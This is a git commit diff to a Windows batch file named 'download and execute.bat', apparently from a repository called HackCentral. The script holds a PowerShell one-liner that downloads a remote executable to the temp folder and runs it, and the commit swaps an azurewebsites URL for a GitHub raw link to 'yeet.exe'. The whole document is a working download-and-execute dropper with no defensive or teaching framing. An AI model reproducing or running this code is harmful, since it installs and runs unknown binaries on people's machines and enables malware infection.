01e3408b0b773671ec8a6b035e1672076f53fa8c
Finn B <finnegolfer@gmail.com>
2018-08-16 07:41:54 -0700

    dd

--- download and execute.bat
+++ download and execute.bat
@@ -1,6 +1,6 @@
 
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'https://github.com/Evergold/HackCentral/raw/master/yeet.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
